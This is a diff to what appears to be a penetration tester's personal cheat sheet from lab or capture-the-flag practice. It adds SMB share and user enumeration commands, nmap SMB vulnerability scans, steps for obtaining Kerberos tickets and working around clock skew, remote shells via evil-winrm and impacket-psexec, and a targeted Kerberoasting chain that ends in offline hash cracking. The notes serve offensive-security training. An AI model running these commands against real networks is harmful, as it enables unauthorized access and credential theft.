@@ -358,12 +358,60 @@ crackmapexec smb <FQDN/IP> --shares -u '' -p '' --shares
 # Enumerating SMB shares using null session authentication with valid session
 crackmapexec smb INLANEFREIGHT.LOCAL --shares -u 'user' -p 'Welcome1'
 
-#SMBMap
+#SMBMap - No great for timeskew
 smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5
 
 smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only
 
 #donwload: smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 --download 'Department Shares/path/to/file'
+
+#Enumerate Host
+netexec smb [ip]
+
+#List Shares
+netexec smb [host/ip] -u [user] -p [pass] --shares
+netexec smb [host/ip] -u guest -p '' --shares
+smbclient -N -L //[ip]
+
+#Enumerate Files
+smbclient //[ip]/[share] -N
+smbclient //[ip]/[share] -U [username] [password]
+netexec smb -u [user] -p [pass] -M spider_plus
+smbclient.py '[domain]/[user]:[pass]@[ip/host] -k -no-pass - Kerberos auth
+manspider.py --threads 256 [IP/CIDR] -u [username] -p [pass] [options]
+
+#User enumeration #RID Cycling
+lookupsid.py guest@[ip] -no-pass
+netexec smb [ip] -u guest -p '' --rid-brute
+#SAM Remote Protocol -
+
+samrdump.py [domain]/[user]:[pass]@[ip]
+
+#Check for Vulnerabilities -
+nmap --script smb-vuln* -p 139,445 [ip]
+
+#Getting a kerberos ticket
+1.Step edit the /etc/krb5.conf
+2. kinit username@domain and enter password
+3. klist -> done.
+
+#Or another options is Impacket to get kerberos ticket
+impacket-getTGT voleur.htb/svc_winrm:'password'
+
+#login if remote managment is enabled with the ccache
+evil-winrm -i dc.domain.htb -r domain.HTB
+
+
+#correcting issues KRB_AP_ERR_SKEW or clock-skew
+systemctl list-units --type=service | grep -E "ntp|time|chrony"
+#I have installed timesyncd
+sudo systemctl stop systemd-timesyncd
+sudo ntpdate domain.htb
+
+#Also you can use faketime
+fake time "2026-05-02 23:40:11" commands (some apps will get around this)
+
+smbclient //DC.VOLEUR.HTB/IT --use-kerberos=required
 
 ```
 ##### NFS
@@ -796,9 +844,12 @@ smbmap -H 10.129.14.128 --upload test.txt"notes\test.txt"
 
 smbclient //server_name/share_name -U username%password
 
+
 #With Domain
 smbclient //server_name/share_name -U domain\\username%password
 
+#With Kerberos ticket
+smbclient //DC.VOLEUR.HTB/IT --use-kerberos=required
 
 #RCE connect with impacket. 
 impacket-psexec administrator:'Password123!'@10.10.110.17
@@ -1402,14 +1453,17 @@ Step 1 — Set fake SPN on target (requires GenericWrite)
 bloodyAD -u mssqladm -p 'pass' \
   -d INLANEFREIGHT.LOCAL \
   --host 172.16.8.3 \
-  set object aduser servicePrincipalName \
+  set object <aduser-target> servicePrincipalName \
   -v 'fake/DEV01.INLANEFREIGHT.LOCAL'
 
 # Step 2 — Kerberoast the target user
 GetUserSPNs.py INLANEFREIGHT.LOCAL/mssqladm:'password' \
   -dc-ip 172.16.8.3 \
-  -request-user aduser \
+  -request-user <aduser-target> \
   -outputfile aduser.hash
+
+#or if ccache avail- GetUserSPNs.py -k -no-pass voleur.htb/svc_ldap -dc-host DC.VOlEUR.HTB -request
+
 
 # Step 3 — Crack offline
 hashcat -m 13100 aduser.hash /usr/share/wordlists/rockyou.txt --force
